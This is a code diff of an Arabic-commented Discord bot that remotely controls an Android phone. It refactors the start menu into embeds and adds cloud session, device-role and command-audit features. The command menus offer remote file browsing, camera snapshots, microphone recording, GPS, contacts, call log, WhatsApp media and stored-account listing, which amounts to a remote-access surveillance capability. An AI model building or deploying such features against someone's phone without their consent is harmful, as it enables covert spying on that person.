+            ("`/battery`", "البطارية"),
+            ("`/phoneinfo`", "معلومات الهاتف"),
+            ("`/storage_test`", "اختبار التخزين"),
+            ("`/ip`", "عنوان IP"),
+            ("`/clipboard`", "الحافظة"),
+            ("`/toast`", "رسالة على الشاشة"),
+            ("`/rescan`", "إعادة اكتشاف الجذور"),
+            ("`/setroot`", "تعيين جذر"),
+        ],
+    },
+    "contacts": {
+        "title": "👥 الاتصالات",
+        "color": Colors.CONTACTS,
+        "commands": [
+            ("`/contacts`", "جهات الاتصال"),
+            ("`/wa`", "محادثة واتساب"),
+            ("`/wa_home`", "فتح واتساب"),
+            ("`/dial`", "لوحة الاتصال"),
+        ],
+    },
+    "location": {
+        "title": "📍 الموقع",
+        "color": Colors.LOCATION,
+        "commands": [
+            ("`/gps`", "الموقع الحالي"),
+            ("`/gps_providers`", "مزودو الموقع"),
+            ("`/ip`", "عنوان IP العام"),
+        ],
+    },
+    "audio": {
+        "title": "🎤 الصوت",
+        "color": Colors.AUDIO,
+        "commands": [
+            ("`/record`", "بدء تسجيل"),
+            ("`/record_stop`", "إيقاف وإرسال"),
+            ("`/record_pause`", "إيقاف مؤقت"),
+            ("`/record_resume`", "استئناف"),
+            ("`/record_status`", "الحالة"),
+            ("`/record_history`", "السجل"),
+            ("`/record_stats`", "الإحصائيات"),
+            ("`/record_cleanup`", "تنظيف"),
+            ("`/record_amplitude`", "مستوى الصوت"),
+        ],
+    },
+    "apps": {
+        "title": "📱 التطبيقات",
+        "color": Colors.APPS,
+        "commands": [
+            ("`/openapp`", "فتح تطبيق"),
+            ("`/apps`", "قائمة التطبيقات"),
+            ("`/openurl`", "فتح رابط"),
+            ("`/open`", "فتح ملف"),
+        ],
+    },
+    "sensors": {
+        "title": "❤️ المستشعرات",
+        "color": Colors.SENSORS,
+        "commands": [
+            ("`/sensors`", "كل المستشعرات"),
+            ("`/heartbeat`", "نبضات القلب"),
+            ("`/steps`", "عدد الخطوات"),
+            ("`/accelerometer`", "التسارع"),
+            ("`/gyroscope`", "الجيروسكوب"),
+        ],
+    },
+    "accounts": {
+        "title": "🔑 الحسابات",
+        "color": Colors.ACCOUNTS,
+        "commands": [
+            ("`/accounts`", "كل الحسابات"),
+            ("`/accounts_stats`", "إحصائيات"),
+            ("`/accounts_grouped`", "مجمّعة حسب الفئة"),
+        ],
+    },
+    "cloud": {
+        "title": "☁️ السحابة",
+        "color": Colors.CLOUD,
+        "commands": [
+            ("`/cloud`", "حالة السحابة"),
+            ("`/session_info`", "حالة الجلسة"),
+            ("`/my_role`", "دور هذا الجهاز"),
+            ("`/cloud_audit`", "آخر الأوامر المسجّلة"),
+        ],
+    },
+}
+
+
+async def _send_category_menu(interaction: discord.Interaction, cat: str):
+    data = _CATEGORY_DATA.get(cat)
+    if not data:
+        await interaction.response.defer()
+        return
+
+    lines = []
+    for cmd, desc in data["commands"]:
+        lines.append(f"• {cmd} — {desc}")
+
+    embed = _make_embed(
+        data["title"],
+        "\n".join(lines),
+        data["color"],
+    )
+    try:
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+    except Exception:
+        try:
+            await interaction.followup.send(embed=embed, ephemeral=True)
+        except Exception:
+            pass
+
+
+# ═══════════════════════════════════════════════════════════════════
+#                       Build Start Embed
+# ═══════════════════════════════════════════════════════════════════
+async def _build_start_embed() -> discord.Embed:
+    perms = {}
+    if _bridge_ready():
+        try:
+            perms_raw = await asyncio.to_thread(
+                _bridge.get_permissions_json)
+            perms = json.loads(perms_raw) if perms_raw else {}
+        except Exception as e:
+            log.error(f"permissions: {e}")
+
+    def mark(key):
+        return "✅" if perms.get(key, False) else "❌"
+
+    keys = ['all_files', 'camera', 'record_audio', 'contacts',
+            'fine_location', 'read_call_log', 'read_phone_state',
+            'call_phone', 'accounts', 'activity_recognition',
+            'body_sensors']
+    granted = sum(1 for k in keys if perms.get(k, False))
+    total = len(keys)
+    pct = int((granted / total) * 100) if total > 0 else 0
+
+    android_ver = perms.get('android', ANDROID.release or '?')
+    sdk_ver = perms.get('sdk', ANDROID.sdk or '?')
+
+    # Cloud status
+    cloud_status = "غير متاح"
+    session_status = "?"
+    is_active = False
+    if _cloud_ready():
+        try:
+            status = _cloud.get_status()
+            cloud_status = "✅ متصل" if status.get("ready") else "⚠️ غير مهيأ"
+            session_info = _cloud.get_session_status()
+            if isinstance(session_info, dict):
+                session_status = session_info.get("status", "?")
+            is_active = _cloud.is_my_session_active()
+        except Exception:
+            pass
+
+    embed = discord.Embed(
+        title=f"🤖 {BOT_TITLE} v{VERSION}",
+        description=(
+            f"*{VERSION_NAME}*\n\n"
+            f"**💫 لوحة التحكم الرئيسية**\n"
+            f"اختر فئة من الأزرار أدناه."
+        ),
+        color=Colors.PRIMARY,
+        timestamp=discord.utils.utcnow(),
+    )
+
+    embed.add_field(
+        name="📱 الجهاز",
+        value=(
+            f"🖥️ `{DEVICE_NAME}`\n"
+            f"🤖 Android `{android_ver}` (SDK `{sdk_ver}`)\n"
+            f"🏭 `{ANDROID.vendor_name}`"
+        ),
+        inline=True,
+    )
+
+    embed.add_field(
+        name="📊 الصلاحيات",
+        value=(
+            f"**{granted}/{total}** ({pct}%)\n"
+            f"{mark('all_files')}📁 {mark('camera')}📷 "
+            f"{mark('record_audio')}🎤\n"
+            f"{mark('contacts')}👥 {mark('fine_location')}📍 "
+            f"{mark('call_phone')}📞"
+        ),
+        inline=True,
+    )
+
+    embed.add_field(
+        name="☁️ السحابة",
+        value=(
+            f"**الحالة:** {cloud_status}\n"
+            f"**الجلسة:** `{session_status}`\n"
+            f"**نشط:** {'✅' if is_active else '❌'}"
+        ),
+        inline=True,
+    )
+
+    embed.add_field(
+        name="✨ الميزات",
+        value=(
+            f"• FileBrowser: {'✅ v2.0' if _ADVANCED_BROWSER else '⚠️ v1.0'}\n"
+            f"• AudioRecorder: ✅ v4.0\n"
+            f"• AccountsHelper: ✅ v3.0\n"
+            f"• Cloud Agent: {'✅' if _CLOUD_AVAILABLE else '❌'}"
+        ),
+        inline=False,
+    )
+
+    embed.set_footer(text=f"Moayed • {len(bot.guilds)} سيرفر • "
+                          f"v{VERSION}")
+    return embed
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -1157,7 +1664,7 @@ _ready_called = {"value": False}
 _synced_once = {"value": False}
 
 
-@bot.event
+@bot_event("on_ready")
 async def on_ready():
     if _ready_called["value"]:
         return
@@ -1167,13 +1674,22 @@ async def on_ready():
     log.info(f"✅ Logged in as {bot.user} (ID: {bot.user.id})")
     log.info(f"✅ Connected to {len(bot.guilds)} guild(s)")
     log.info(f"🌉 bridge.py: {'✅' if _BRIDGE_AVAILABLE else '❌'}")
+    log.info(f"☁️ cloud_agent.py: {'✅' if _CLOUD_AVAILABLE else '❌'}")
     log.info(f"📂 file_browser.py: {'✅' if _ADVANCED_BROWSER else '❌'}")
 
-    # تحميل معلومات Android
     try:
         ANDROID.load()
     except Exception as e:
         log.warning(f"AndroidVersion load failed: {e}")
+
+    # 🆕 v8.0: Report to cloud
+    if _cloud_ready():
+        try:
+            _cloud.report_bot_running(True)
+            STATE.cloud_reported = True
+            log.info("☁️ Reported bot_running=True")
+        except Exception as e:
+            log.warning(f"cloud report failed: {e}")
 
     if _synced_once["value"]:
         return
@@ -1196,26 +1712,26 @@ async def on_ready():
         await bot.change_presence(
             activity=discord.Activity(
                 type=discord.ActivityType.watching,
-                name="📱 /start | Moayed"),
+                name=f"📱 {BOT_TITLE} | /start"),
             status=discord.Status.online,
         )
     except Exception as e:
         log.warning(f"Presence error: {e}")
 
-    log.info("🎉 البوت جاهز — Moayed Edition")
+    log.info(f"🎉 البوت جاهز — {VERSION_NAME}")
 
 
-@bot.event
+@bot_event("on_disconnect")
 async def on_disconnect():
     log.warning("⚠️ Disconnected from Discord")
 
 
-@bot.event
+@bot_event("on_resumed")
 async def on_resumed():
     log.info("🔄 Session resumed")
 
 
-@bot.event
+@bot_event("on_error")
 async def on_error(event_method, *args, **kwargs):
     log.error(f"⚠️ Unhandled error in {event_method}")
     try:
@@ -1224,7 +1740,7 @@ async def on_error(event_method, *args, **kwargs):
         pass
 
 
-@bot.event
+@bot_event("on_message")
 async def on_message(message):
     allowed = STATE.get_allowed_id()
     if allowed is None or message.author.id != allowed:
@@ -1264,154 +1780,38 @@ async def on_message(message):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       /start — Moayed Edition
+#                       /start
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="start", description="لوحة التحكم الرئيسية")
+@bot_command("start", "🏠 القائمة الرئيسية")
 @require_allowed
 @with_stats("start")
 async def start_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
-
-    perms = {}
-    if _bridge_ready():
-        try:
-            perms_raw = await asyncio.to_thread(
-                _bridge.get_permissions_json)
-            perms = json.loads(perms_raw) if perms_raw else {}
-        except Exception as e:
-            log.error(f"permissions: {e}")
-
-    def mark(key, label):
-        val = perms.get(key, False)
-        return f"{'✅' if val else '❌'} {label}"
-
-    keys = ['all_files', 'camera', 'record_audio', 'contacts',
-            'fine_location', 'read_call_log', 'read_phone_state',
-            'call_phone', 'accounts', 'activity_recognition',
-            'body_sensors']
-    granted = sum(1 for k in keys if perms.get(k, False))
-    total = len(keys)
-    pct = int((granted / total) * 100) if total > 0 else 0
-
-    android_ver = perms.get('android', ANDROID.release or '?')
-    sdk_ver = perms.get('sdk', ANDROID.sdk or '?')
-
-    # ═══ الشعار المزخرف — Moayed ═══
-    banner = (
-        "╔═══════════════════════════════════════╗\n"
-        "║                                       ║\n"
-        "║         ✦ ─────────────── ✦           ║\n"
-        "║                                       ║\n"
-        "║            🌟 **𝐌𝐨𝐚𝐲𝐞𝐝** 🌟            ║\n"
-        "║                                       ║\n"
-        "║         ✦ ─────────────── ✦           ║\n"
-        "║                                       ║\n"
-        "╚═══════════════════════════════════════╝"
-    )
-
-    header = (
-        f"{banner}\n\n"
-        f"           🤖 **{BOT_TITLE} v{VERSION}**\n"
-        f"        ━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🖥️ **الجهاز:** `{DEVICE_NAME}`\n"
-        f"📱 **Android:** `{android_ver}` (SDK `{sdk_ver}`)\n"
-        f"🏭 **المُصنّع:** `{ANDROID.vendor_name}`\n"
-        f"📊 **الصلاحيات:** **{granted}/{total}** ({pct}%)\n"
-    )
-
-    perm_section = (
-        f"\n┌─────────────────────────────┐\n"
-        f"│       🔐 **الصلاحيات**      │\n"
-        f"└─────────────────────────────┘\n"
-        f"{mark('all_files', '📁 الملفات')}\n"
-        f"{mark('camera', '📷 الكاميرا')}\n"
-        f"{mark('record_audio', '🎤 الميكروفون')}\n"
-        f"{mark('contacts', '👥 الاتصالات')}\n"
-        f"{mark('fine_location', '📍 الموقع')}\n"
-        f"{mark('read_call_log', '📞 سجل المكالمات')}\n"
-        f"{mark('read_phone_state', '📱 الهاتف')}\n"
-        f"{mark('call_phone', '☎️ الاتصال')}\n"
-        f"{mark('accounts', '🔑 الحسابات')}\n"
-        f"{mark('activity_recognition', '🏃 النشاط')}\n"
-        f"{mark('body_sensors', '❤️ المستشعرات')}\n"
-    )
-
-    features = ""
-    if _ADVANCED_BROWSER:
-        features += "  ✨ **FileBrowser v2.0** (متقدم)\n"
-    else:
-        features += "  📂 FileBrowser v1.0 (مبسط)\n"
-    features += "  🎤 **AudioRecorder v4.0**\n"
-    features += "  🔑 **AccountsHelper v3.0**\n"
-
-    commands_list = (
-        f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"**📁 الملفات**\n"
-        f"`/browse` `/storage` `/tree` `/search`\n"
-        f"`/find` `/get` `/zip` `/latest`\n"
-        f"`/save` `/favorites` `/upload`\n\n"
-        f"**📸 الوسائط**\n"
-        f"`/camera` `/screenshots` `/downloads`\n"
-        f"`/documents` `/whatsapp_media`\n"
-        f"`/snap_back` `/snap_front` `/camera_app`\n"
-        f"`/screenshot` `/pull_camera` `/pull_screens`\n\n"
-        f"**👥 الاتصالات**\n"
-        f"`/contacts` `/wa` `/wa_home` `/dial`\n\n"
-        f"**📞 الهاتف**\n"
-        f"`/calllog` `/call` `/phoneinfo`\n\n"
-        f"**📍 الموقع**\n"
-        f"`/gps` `/gps_providers` `/ip`\n\n"
-        f"**🎤 الصوت** (v4.0)\n"
-        f"`/record` `/record_stop` `/record_status`\n"
-        f"`/record_pause` `/record_resume`\n"
-        f"`/record_history` `/record_stats`\n"
-        f"`/record_cleanup` `/record_amplitude`\n\n"
-        f"**🔑 الحسابات** (v3.0)\n"
-        f"`/accounts` `/accounts_stats` `/accounts_grouped`\n\n"
-        f"**❤️ المستشعرات**\n"
-        f"`/sensors` `/heartbeat` `/steps`\n"
-        f"`/accelerometer` `/gyroscope`\n\n"
-        f"**📱 التطبيقات**\n"
-        f"`/openapp` `/apps` `/openurl` `/open`\n\n"
-        f"**🔧 الأدوات**\n"
-        f"`/battery` `/clipboard` `/toast`\n"
-        f"`/roots` `/setroot` `/rescan` `/storage_test`\n\n"
-        f"**ℹ️ معلومات**\n"
-        f"`/sysinfo` `/health` `/stats` `/ping` `/whoami`\n\n"
-        f"**⚙️ صيانة**\n"
-        f"`/clearcache` `/resume` `/stop`\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"✨ **الميزات النشطة:**\n"
-        f"{features}"
-    )
-
-    full = header + perm_section + commands_list
-    if len(full) > 2000:
-        full = full[:1990] + "\n..."
-
-    await interaction.followup.send(full)
+    embed = await _build_start_embed()
+    view = MainMenuView()
+    await interaction.followup.send(embed=embed, view=view)
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Core Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="ping", description="🏓 اختبار سرعة الاستجابة")
+@bot_command("ping", "🏓 اختبار سرعة الاستجابة")
 @require_allowed
 @with_stats("ping")
 async def ping_cmd(interaction: discord.Interaction):
     start = time.time()
     await interaction.response.send_message("🏓 Pong!")
     latency = (time.time() - start) * 1000
-    await interaction.edit_original_response(
-        content=(
-            f"🏓 **Pong!**\n"
-            f"⚡ البوت: `{latency:.1f}ms`\n"
-            f"🟢 Discord: `{bot.latency * 1000:.1f}ms`"
-        )
+    embed = _make_embed(
+        "🏓 Pong!",
+        f"⚡ **البوت:** `{latency:.1f}ms`\n"
+        f"🟢 **Discord:** `{bot.latency * 1000:.1f}ms`",
+        Colors.SUCCESS,
     )
+    await interaction.edit_original_response(content=None, embed=embed)
 
 
-@bot.tree.command(name="stats", description="📊 إحصائيات الاستخدام")
+@bot_command("stats", "📊 إحصائيات الاستخدام")
 @require_allowed
 @with_stats("stats")
 async def stats_cmd(interaction: discord.Interaction):
@@ -1423,81 +1823,290 @@ async def stats_cmd(interaction: discord.Interaction):
         f"`{name}`: {count}" for name, count in s["errors"].items()
     ) or "لا شيء"
 
-    await interaction.response.send_message(
-        f"📊 **إحصائيات البوت:**\n\n"
-        f"⏱️ مدة التشغيل: `{s['uptime_human']}`\n"
-        f"📁 ملفات مُرسلة: **{s['files_sent']}**\n"
-        f"💾 حجم مُرسل: `{s['bytes_sent_human']}`\n"
-        f"🎯 إجمالي الأوامر: **{s['total_commands']}**\n\n"
-        f"**🏆 الأكثر استخدامًا:**\n{top}\n\n"
-        f"**⚠️ الأخطاء:**\n{errors}"
-    )
+    embed = _make_embed("📊 إحصائيات البوت", color=Colors.PRIMARY)
+    embed.add_field(name="⏱️ الوقت",
+                    value=f"`{s['uptime_human']}`", inline=True)
+    embed.add_field(name="📁 ملفات",
+                    value=f"**{s['files_sent']}**", inline=True)
+    embed.add_field(name="💾 حجم",
+                    value=f"`{s['bytes_sent_human']}`", inline=True)
+    embed.add_field(name="🎯 الأوامر",
+                    value=f"**{s['total_commands']}**", inline=True)
+    embed.add_field(name="🏆 الأكثر استخدامًا",
+                    value=top[:1024] or "—", inline=False)
+    embed.add_field(name="⚠️ الأخطاء",
+                    value=errors[:1024], inline=False)
+    await interaction.response.send_message(embed=embed)
 
 
-@bot.tree.command(name="whoami", description="👤 معلومات عنك")
+@bot_command("whoami", "👤 معلومات عنك")
 @require_allowed
 @with_stats("whoami")
 async def whoami_cmd(interaction: discord.Interaction):
     user = interaction.user
     created = user.created_at.strftime("%Y-%m-%d")
-    await interaction.response.send_message(
-        f"👤 **{user.name}**\n"
+    embed = _make_embed(
+        f"👤 {user.name}",
         f"🆔 `{user.id}`\n"
         f"📅 منذ: `{created}`\n"
-        f"✅ مصرّح"
+        f"✅ مصرّح",
+        Colors.INFO,
     )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
-@bot.tree.command(name="health", description="🏥 فحص صحة البوت")
+@bot_command("health", "🏥 فحص صحة البوت")
 @require_allowed
 @with_stats("health")
 async def health_cmd(interaction: discord.Interaction):
     with STATE._lock:
-        uptime_sec = int(time.time() - STATE.start_time) if STATE.start_time else 0
+        uptime_sec = (int(time.time() - STATE.start_time)
+                      if STATE.start_time else 0)
         is_running = STATE.is_running
         last_error = STATE.last_error
         owner = STATE.owner_id
+        device_id = STATE.device_id
 
-    lines = [
-        "**🏥 Health Report**", "```",
-        f"Version      : {VERSION} ({VERSION_NAME})",
-        f"Bot User     : {bot.user}",
-        f"Latency      : {round(bot.latency * 1000)}ms",
-        f"Guilds       : {len(bot.guilds)}",
-        f"Uptime       : {uptime_sec}s",
-        f"Commands run : {STATS.to_dict()['total_commands']}",
-        f"is_running   : {is_running}",
-        f"Owner ID     : {owner or '—'}",
-        f"Android      : {ANDROID.release} (API {ANDROID.sdk})",
-        f"Vendor       : {ANDROID.vendor_name}",
-        f"bridge.py    : {'✅' if _BRIDGE_AVAILABLE else '❌'}",
-        f"file_browser : {'✅' if _ADVANCED_BROWSER else '❌'}",
-        f"Contacts     : {'✅' if _is_contacts_ready() else '❌'}",
-        f"PIL          : {'✅' if HAS_PIL else '❌'}",
-        f"Last error   : {last_error or '—'}",
-        "```",
-    ]
-    await interaction.response.send_message("\n".join(lines))
+    cloud_info = "غير متاح"
+    if _cloud_ready():
+        try:
+            status = _cloud.get_status()
+            cloud_info = "✅" if status.get("ready") else "⚠️"
+        except Exception:
+            pass
+
+    embed = _make_embed("🏥 Health Report", color=Colors.INFO)
+    embed.add_field(
+        name="🤖 البوت",
+        value=(
+            f"• النسخة: `{VERSION}`\n"
+            f"• التشغيل: `{uptime_sec}s`\n"
+            f"• Latency: `{round(bot.latency * 1000)}ms`\n"
+            f"• السيرفرات: `{len(bot.guilds)}`"
+        ),
+        inline=True,
+    )
+    embed.add_field(
+        name="📱 Android",
+        value=(
+            f"• الإصدار: `{ANDROID.release}`\n"
+            f"• SDK: `{ANDROID.sdk}`\n"
+            f"• المُصنّع: `{ANDROID.vendor_name}`"
+        ),
+        inline=True,
+    )
+    embed.add_field(
+        name="🔌 المكونات",
+        value=(
+            f"• Bridge: {'✅' if _BRIDGE_AVAILABLE else '❌'}\n"
+            f"• Cloud: {cloud_info}\n"
+            f"• Browser: {'✅' if _ADVANCED_BROWSER else '⚠️'}\n"
+            f"• Contacts: {'✅' if _is_contacts_ready() else '❌'}\n"
+            f"• PIL: {'✅' if HAS_PIL else '❌'}"
+        ),
+        inline=False,
+    )
+    if device_id:
+        embed.add_field(
+            name="🆔 الجهاز",
+            value=f"`{device_id[:8]}...`",
+            inline=True,
+        )
+    if last_error:
+        embed.add_field(
+            name="⚠️ آخر خطأ",
+            value=f"`{last_error[:200]}`",
+            inline=False,
+        )
+    await interaction.response.send_message(embed=embed)
 
 
-@bot.tree.command(name="clearcache", description="🧹 مسح الذاكرة المؤقتة")
+@bot_command("clearcache", "🧹 مسح الذاكرة المؤقتة")
 @require_allowed
 @with_stats("clearcache")
 async def clearcache_cmd(interaction: discord.Interaction):
     size_before = LIST_CACHE.size()
     LIST_CACHE.clear()
     RATE_LIMITER.reset(interaction.user.id)
-    await interaction.response.send_message(
-        f"🧹 تم المسح\n"
+    embed = _make_embed(
+        "🧹 تم المسح",
         f"• Cache: `{size_before}` → `0`\n"
-        f"• Rate Limiter: مُعاد تعيينه"
+        f"• Rate Limiter: مُعاد تعيينه",
+        Colors.SUCCESS,
     )
+    await interaction.response.send_message(embed=embed)
+
+
+# ═══════════════════════════════════════════════════════════════════
+#                       Cloud Commands
+# ═══════════════════════════════════════════════════════════════════
+@bot_command("cloud", "☁️ حالة السحابة والجلسة")
+@require_allowed
+@with_stats("cloud")
+async def cloud_cmd(interaction: discord.Interaction):
+    if not _cloud_ready():
+        await interaction.response.send_message(
+            embed=_make_error_embed("Cloud Agent غير متاح"),
+            ephemeral=True,
+        )
+        return
+
+    try:
+        status = _cloud.get_status()
+        session = _cloud.get_session_status()
+        is_active = _cloud.is_my_session_active()
+    except Exception as e:
+        await interaction.response.send_message(
+            embed=_make_error_embed(str(e)),
+            ephemeral=True,
+        )
+        return
+
+    embed = _make_embed("☁️ حالة السحابة", color=Colors.CLOUD)
+    embed.add_field(
+        name="📡 الاتصال",
+        value=(
+            f"• الحالة: {'✅ متصل' if status.get('ready') else '❌'}\n"
+            f"• الجهاز: `{status.get('device_id', '?')}`\n"
+            f"• Gen: `{status.get('generation', 0)}`"
+        ),
+        inline=True,
+    )
+    if isinstance(session, dict):
+        embed.add_field(
+            name="🔗 الجلسة",
+            value=(
+                f"• الحالة: `{session.get('status', '?')}`\n"
+                f"• أنا النشط: {'✅' if is_active else '❌'}\n"
+                f"• Health: `{session.get('health_score', '?')}`"
+            ),
+            inline=True,
+        )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
+@bot_command("session_info", "🔗 معلومات bot_session")
+@require_allowed
+@require_cloud
+@with_stats("session_info")
+async def session_info_cmd(interaction: discord.Interaction):
+    await interaction.response.defer(ephemeral=True)
+    try:
+        session = _cloud.get_session_status()
+        is_active = _cloud.is_my_session_active()
+    except Exception as e:
+        await interaction.followup.send(
+            embed=_make_error_embed(str(e)), ephemeral=True)
+        return
+
+    if not isinstance(session, dict):
+        await interaction.followup.send(
+            embed=_make_warning_embed("لا توجد جلسة نشطة"),
+            ephemeral=True)
+        return
+
+    embed = _make_embed("🔗 bot_session", color=Colors.CLOUD)
+    for key, label in [
+        ("status", "الحالة"),
+        ("user_device_id", "User Device"),
+        ("admin_device_id", "Admin Device"),
+        ("health_score", "Health Score"),
+        ("has_token", "التوكن موجود"),
+        ("is_running", "يعمل"),
+        ("is_active", "هذا الجهاز"),
+    ]:
+        val = session.get(key, "?")
+        if isinstance(val, str) and len(val) > 12:
+            val = val[:8] + "..."
+        embed.add_field(name=label, value=f"`{val}`", inline=True)
+    embed.add_field(
+        name="🎯 أنا النشط",
+        value="✅" if is_active else "❌",
+        inline=False,
+    )
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+
+@bot_command("my_role", "🎭 دور هذا الجهاز")
+@require_allowed
+@with_stats("my_role")
+async def my_role_cmd(interaction: discord.Interaction):
+    role = "غير معروف"
+    device_id = STATE.device_id or "—"
+
+    try:
+        from java import jclass
+        DeviceIdentity = jclass(
+            "com.example.myfirstapp.cloud.core.DeviceIdentity")
+        identity = DeviceIdentity.get(STATE.context)
+        r = str(identity.getRole())
+        if r == "admin":
+            role = "👑 Admin"
+        elif r == "user":
+            role = "👤 User"
+        else:
+            role = f"`{r}`"
+    except Exception as e:
+        role = f"خطأ: {str(e)[:50]}"
+
+    embed = _make_embed(
+        "🎭 دور الجهاز",
+        f"**الدور:** {role}\n"
+        f"**Device ID:** `{device_id[:12] + '...' if len(device_id) > 12 else device_id}`",
+        Colors.CLOUD,
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
+@bot_command("cloud_audit", "📜 آخر الأوامر المسجّلة في السحابة")
+@require_allowed
+@require_cloud
+@with_stats("cloud_audit")
+async def cloud_audit_cmd(interaction: discord.Interaction):
+    await interaction.response.defer(ephemeral=True)
+
+    try:
+        from java import jclass
+        Repo = jclass(
+            "com.example.myfirstapp.cloud.repos.CloudCommandRepository")
+        repo = Repo(STATE.context)
+        device_id = STATE.device_id
+        commands_list = repo.fetchRecentFor(device_id, 10)
+    except Exception as e:
+        await interaction.followup.send(
+            embed=_make_error_embed(f"تعذر الاتصال: {e}"),
+            ephemeral=True)
+        return
+
+    if not commands_list:
+        await interaction.followup.send(
+            embed=_make_warning_embed("لا توجد أوامر مسجّلة"),
+            ephemeral=True)
+        return
+
+    lines = []
+    for i, cmd in enumerate(commands_list[:10], 1):
+        try:
+            action = str(cmd.action)
+            status = str(cmd.status)
+            icon = {"done": "✅", "failed": "❌",
+                    "pending": "⏳"}.get(status, "❔")
+            lines.append(f"`{i}.` {icon} `{action}` — {status}")
+        except Exception:
+            continue
+
+    embed = _make_embed(
+        "📜 آخر الأوامر",
+        "\n".join(lines),
+        Colors.CLOUD,
+    )
+    await interaction.followup.send(embed=embed, ephemeral=True)
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Files Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="browse", description="📂 تصفح حر لأي مسار")
+@bot_command("browse", "📂 تصفح حر لأي مسار")
 @app_commands.describe(path="المسار (افتراضي: الجذر)")
 @require_allowed
 @with_stats("browse")
@@ -1506,74 +2115,74 @@ async def browse_cmd(interaction: discord.Interaction, path: str = None):
     await _open_browser(interaction, target)
 
 
-@bot.tree.command(name="storage", description="📁 التخزين الرئيسي")
+@bot_command("storage", "📁 التخزين الرئيسي")
 @require_allowed
 @with_stats("storage")
 async def storage_cmd(interaction: discord.Interaction):
     await _open_browser(interaction, ALLOWED_ROOT)
 
 
-@bot.tree.command(name="camera", description="📸 مجلد الكاميرا")
+@bot_command("camera", "📸 مجلد الكاميرا")
 @require_allowed
 @with_stats("camera")
 async def camera_cmd(interaction: discord.Interaction):
     path = _find_dir_in_roots(CAMERA_PATHS)
     if not path:
-        await interaction.response.send_message(
-            "❌ لم أجد مجلد الكاميرا.", ephemeral=True)
+        await _safe_reply(interaction, "❌ لم أجد مجلد الكاميرا.",
+                          ephemeral=True)
         return
     await _open_browser(interaction, path)
 
 
-@bot.tree.command(name="screenshots", description="🖼️ لقطات الشاشة")
+@bot_command("screenshots", "🖼️ لقطات الشاشة")
 @require_allowed
 @with_stats("screenshots")
 async def screenshots_cmd(interaction: discord.Interaction):
     path = _find_dir_in_roots(SCREENSHOT_PATHS)
     if not path:
-        await interaction.response.send_message(
-            "❌ لم أجد مجلد اللقطات.", ephemeral=True)
+        await _safe_reply(interaction, "❌ لم أجد مجلد اللقطات.",
+                          ephemeral=True)
         return
     await _open_browser(interaction, path)
 
 
-@bot.tree.command(name="downloads", description="📥 التنزيلات")
+@bot_command("downloads", "📥 التنزيلات")
 @require_allowed
 @with_stats("downloads")
 async def downloads_cmd(interaction: discord.Interaction):
     path = _find_dir_in_roots(DOWNLOAD_PATHS)
     if not path:
-        await interaction.response.send_message(
-            "❌ لم أجد مجلد التنزيلات.", ephemeral=True)
+        await _safe_reply(interaction, "❌ لم أجد مجلد التنزيلات.",
+                          ephemeral=True)
         return
     await _open_browser(interaction, path)
 
 
-@bot.tree.command(name="documents", description="📄 المستندات")
+@bot_command("documents", "📄 المستندات")
 @require_allowed
 @with_stats("documents")
 async def documents_cmd(interaction: discord.Interaction):
     path = _find_dir_in_roots(DOCUMENT_PATHS)
     if not path:
-        await interaction.response.send_message(
-            "❌ لم أجد مجلد المستندات.", ephemeral=True)
+        await _safe_reply(interaction, "❌ لم أجد مجلد المستندات.",
+                          ephemeral=True)
         return
     await _open_browser(interaction, path)
 
 
-@bot.tree.command(name="whatsapp_media", description="💬 وسائط واتساب")
+@bot_command("whatsapp_media", "💬 وسائط واتساب")
 @require_allowed
 @with_stats("whatsapp_media")
 async def whatsapp_media_cmd(interaction: discord.Interaction):
     path = _find_dir_in_roots(WHATSAPP_MEDIA_PATHS)
     if not path:
-        await interaction.response.send_message(
-            "❌ لم أجد مجلد وسائط واتساب.", ephemeral=True)
+        await _safe_reply(interaction, "❌ لم أجد مجلد وسائط واتساب.",
+                          ephemeral=True)
         return
     await _open_browser(interaction, path)
 
 
-@bot.tree.command(name="tree", description="🌳 شجرة مجلد")
+@bot_command("tree", "🌳 شجرة مجلد")
 @app_commands.describe(path="المسار", depth="العمق (1-5)")
 @require_allowed
 @with_stats("tree")
@@ -1581,8 +2190,7 @@ async def tree_cmd(interaction: discord.Interaction, path: str = None,
                    depth: int = 3):
     target = path or ALLOWED_ROOT
     if not is_path_allowed(target) or not os.path.isdir(target):
-        await interaction.response.send_message(
-            "❌ مسار غير صالح.", ephemeral=True)
+        await _safe_reply(interaction, "❌ مسار غير صالح.", ephemeral=True)
         return
     depth = max(1, min(5, depth))
     await interaction.response.defer()
@@ -1603,10 +2211,15 @@ async def tree_cmd(interaction: discord.Interaction, path: str = None,
             except Exception:
                 pass
     else:
-        await interaction.followup.send(f"```\n{text[:1900]}\n```")
+        embed = _make_embed(
+            f"🌳 `{target}`",
+            f"```\n{text[:1900]}\n```",
+            Colors.FILES,
+        )
+        await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="search", description="🔎 بحث متقدم")
+@bot_command("search", "🔎 بحث متقدم")
 @app_commands.describe(name="الاسم أو Regex", regex="استخدام Regex؟",
                         limit="الحد (1-25)")
 @require_allowed
@@ -1621,20 +2234,21 @@ async def search_cmd(interaction: discord.Interaction, name: str,
                                      use_regex=regex)
     except Exception as e:
         STATS.record_error("search")
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
     if not results:
-        await interaction.followup.send(f"لا نتائج لـ `{name}`.")
+        await _safe_reply(interaction, f"لا نتائج لـ `{name}`.")
         return
     view = FindResultsView(results, name)
-    await interaction.followup.send(
